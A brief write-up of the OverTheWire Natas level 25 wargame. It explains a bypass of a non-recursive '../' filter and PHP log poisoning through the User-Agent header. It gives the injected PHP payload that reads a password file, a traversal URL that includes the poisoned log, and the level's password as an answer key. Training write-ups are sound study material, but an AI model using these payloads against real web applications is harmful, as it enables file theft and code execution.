# 🚩 OverTheWire: Natas Wargame Solutions - Level 25
---
**Vulnerabilities**
1. **Directory Traversal Bypass:** The function `str_replace("../","",$filename)` is not recursive. By inputting `....//`, the function removes the inner `../` and leaves a valid `../` behind.
2. **Log Poisoning:** The server logs the `User-Agent` directly into a file without sanitization: `$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];`. This allows for PHP command injection.
So
**Inject the Payload:** Send a request with the malicious PHP code in the `User-Agent` header:
`User-Agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>`

And then **Trigger the Exploit:** Use the traversal bypass to `include()` the log file corresponding to your session ID:
`http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log`

Password for next level = `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`